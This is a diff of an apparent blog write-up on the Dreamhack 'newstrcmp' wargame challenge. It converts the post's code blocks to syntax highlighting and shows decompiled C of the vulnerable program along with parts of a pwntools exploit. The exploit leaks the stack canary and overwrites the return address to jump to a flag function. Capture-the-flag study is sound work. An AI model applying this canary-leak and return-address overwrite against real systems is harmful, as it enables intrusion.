@@ -3,10 +3,8 @@ title: newstrcmp
 ---
 <p>The problem can be viewed <a href="https://dreamhack.io/wargame/challenges/980">here</a></p>
 <p>The discompilation of the target program is as below.</p>
-{% raw %}
-<pre><code>
-
-void newstrcmp(char *s1,long s2,int *result(index,(s1>=s2=1,s1&lt;s2=-1)))
+{% highlight c %}
+void newstrcmp(char *s1,long s2,int *result(index,(s1>=s2=1,s1<s2=-1)))
 {
   size_t len;
   int bigger;
@@ -15,22 +13,22 @@ void newstrcmp(char *s1,long s2,int *result(index,(s1>=s2=1,s1&lt;s2=-1)))
   len = strlen(s1);
   i = 0;
   while( true ) {
-    if ((int)len &lt;= i) {
-      result(index,(s1>=s2=1,s1&lt;s2=-1))[1] = 0;
-      *result(index,(s1>=s2=1,s1&lt;s2=-1)) = -1;
+    if ((int)len <= i) {
+      result(index,(s1>=s2=1,s1<s2=-1))[1] = 0;
+      *result(index,(s1>=s2=1,s1<s2=-1)) = -1;
       return;
     }
     if (s1[i] != *(char *)(s2 + i)) break;
     i = i + 1;
   }
-  if ((byte)s1[i] &lt; *(byte *)(s2 + i)) {
+  if ((byte)s1[i] < *(byte *)(s2 + i)) {
     bigger = -1;
   }
   else {
     bigger = 1;
   }
-  result(index,(s1>=s2=1,s1&lt;s2=-1))[1] = bigger;
-  *result(index,(s1>=s2=1,s1&lt;s2=-1)) = i;
+  result(index,(s1>=s2=1,s1<s2=-1))[1] = bigger;
+  *result(index,(s1>=s2=1,s1<s2=-1)) = i;
   return;
 }
 
@@ -58,7 +56,7 @@ undefined8 main(void)
   long fs:;
   uint trial;
   uint first_difference(result);
-  int s1>=s2->1|s1&lt;s2->-1;
+  int s1>=s2->1|s1<s2->-1;
   char exit? [2];
   undefined1 s1 [16];
   undefined8 local_38;
@@ -84,10 +82,10 @@ undefined8 main(void)
     read(0,s2,0x40);
     newstrcmp(s1,s2,&first_difference(result));
     printf("Result of newstrcmp: ");
-    if (s1>=s2->1|s1&lt;s2->-1 == 0) {
+    if (s1>=s2->1|s1<s2->-1 == 0) {
       puts("Two strings are the same!");
     }
-    else if (s1>=s2->1|s1&lt;s2->-1 &lt; 0) {
+    else if (s1>=s2->1|s1<s2->-1 < 0) {
       printf("s1 is smaller than s2, first differs at %d\n",(ulong)first_difference(result));
     }
     else {
@@ -100,8 +98,7 @@ undefined8 main(void)
   }
   return 0;
 }
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 <p>We can deduce that the stack frame of <code>main</code> will look like below from the disassembly and decompilation.
 </p>
 <img src="main_stackframe.png" width="20%" height="auto">
@@ -122,8 +119,7 @@ undefined8 main(void)
   After figuring out the canary, creating a payload to overwrite the return address is trivial.
   The exploit code is as below.
 </p>
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/python3
 from pwn import *
 
@@ -173,5 +169,4 @@ if __name__ == "__main__":
     p.sendafter(b"s2: ", b"A"*24 + canary + b"B"*8 + p64(flag))
     p.sendafter(b"Exit? (y/n): ", b"y")
     p.interactive()
-</code></pre>
-{% endraw %}
+{% endhighlight %}
